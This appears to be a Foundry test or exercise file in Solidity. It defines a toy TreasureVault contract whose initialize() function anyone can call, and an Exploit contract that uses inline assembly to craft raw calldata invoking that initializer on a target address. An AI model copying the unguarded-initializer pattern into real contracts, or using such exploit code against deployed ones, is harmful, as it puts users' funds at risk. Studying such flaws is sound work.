// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

contract TreasureVault {
    mapping(address => uint256) public deposits;

    address public owner;
    bool public initialized;

    constructor() {
        owner = msg.sender;
    }

    function initialize() external {
        console.log("INITIALIZE!!!");
        require(!initialized);
        initialized = true;
    }

    function getData() external returns (uint256 res) {
        assembly {
            res := sload(1)
            let addr := and(res, 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF)
            let init := shr(255, res)

            let mptr := mload(0x40)

            mstore(mptr, res)
            log3(mptr, 0x20, res, addr, init)
        }
    }

    function getSlot() external returns (uint256 slot1, uint256 slot2) {
        assembly {
            slot1 := owner.slot
            slot2 := initialized.slot
        }
    }

    function deposit() external payable {
        deposits[msg.sender] += msg.value;
    }

    function withdraw() external {
        require(deposits[msg.sender] > 0);
        uint256 amount = deposits[msg.sender];
        deposits[msg.sender] = 0;
        payable(msg.sender).transfer(amount);
    }

    function emergencyWithdraw() external {
        require(msg.sender == owner);
        payable(msg.sender).transfer(address(this).balance);
    }
}

contract Exploit {
    function exploit(address _to) external returns (bool success) {
        assembly {
            let mptr := mload(0x40)

            // 0x8129fc1c
            mstore(mptr, 0x8129fc1c)
            mstore(add(mptr, 0x20), address())

            // 0x000000000000000000000000000000000000000000000000000000008129fc1c
            //   0000000000000000000000002e234dae75c793f67a35089c9d99245e1c58470b

            log1(mptr, 0x40, _to)

            success := call(gas(), _to, 0, add(mptr, 0x1c), 0x40, 0x00, 0x00)
        }

        // console.log('SUCCESS', success);
        // console.log('EXPLOIT', address(this));
    }
}
